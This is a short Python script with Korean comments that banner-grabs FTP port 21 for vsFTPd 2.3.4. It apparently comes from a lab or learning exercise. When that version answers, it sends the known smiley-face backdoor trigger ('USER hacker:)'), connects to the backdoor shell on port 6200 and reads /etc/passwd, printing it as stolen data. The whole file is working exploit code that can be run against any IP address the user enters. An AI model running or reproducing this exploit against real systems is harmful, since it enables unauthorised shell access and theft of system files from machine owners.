import socket
import time
from datetime import datetime

target = input("타겟 ip를 입력하세요")
target_port = 21

print("-" * 50)
print(f"배너 그래빙 스캔 시작: {target}")
print("-" * 50)

def scan_target(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)

        result = s.connect_ex((ip, 21))

        if result == 0:
            banner = s.recv(1024).decode()

            if "vsFTPd 2.3.4" in banner:
                print(f"[+] 취약버젼 발견! ({banner.strip()})")
                s.close()
                return True
            else:
                print(f"[-] 버젼이 다릅니다: {banner.strip()}")
                s.close()
                return False
        else:
            print("[-] 21번 포트가 닫혀있습니다")
            return False
    except Exception as e:
        print(f"[-]에러: {e}")

target_ip = target
if scan_target(target_ip) == True:
    print(">>>공격을 시작합니다<<<")
    print(f"[*] {target_ip} 로 백도어 공격을 시도합니다...")

    # 2. 1단계: 백도어 트리거 (스마일 이모티콘 보내기)
    try:
    # 소켓 생성 및 FTP 연결
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
    
    # 서버의 환영 메시지 받기 (Banner)
        banner = s.recv(1024).decode()
        print(f"[*] 서버 연결 성공: {banner.strip()}")
    
    # 악의적인 아이디 전송 (:) 스마일 포함)
        print("[*] 악성 페이로드(스마일) 전송 중...")
        s.send(b"USER hacker:)\r\n") 
    
    # 비밀번호는 아무거나 전송
        s.send(b"PASS 1234\r\n")
    
    # 서버가 백도어 포트(6200)를 열 때까지 잠시 대기
        time.sleep(2) 
        s.close()
        print("[*] 트리거 완료. 백도어 포트(6200) 접속 시도 중...")

    except Exception as e:
        print(f"[-] 연결 실패: {e}")
        exit()

    # 3. 2단계: 열린 뒷문(6200번)으로 들어가기
    try:
    # 새 소켓으로 6200번 포트 접속
        backdoor_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_s.connect((target_ip, 6200))
    
        print("\n[!!!] 침투 성공! 쉘 권한을 획득했습니다. [!!!]")
        
    # 4. 쉘 명령어 주고받기 (해커의 채팅 프로그램과 같은 원리)
        command = "head -n 5 /etc/passwd\n"
        backdoor_s.send(command.encode())
        data = backdoor_s.recv(4096).decode()
        
        print("-" * 50)
        print("---[탈취된 데이터: /etc/passwd ]---")
        print(data)
        print("-" * 50)

        backdoor_s.close()
    except Exception as e:
        print(f"[-] 백도어 접속 실패: {e}")

else:
    print(">>>공격 중단<<<")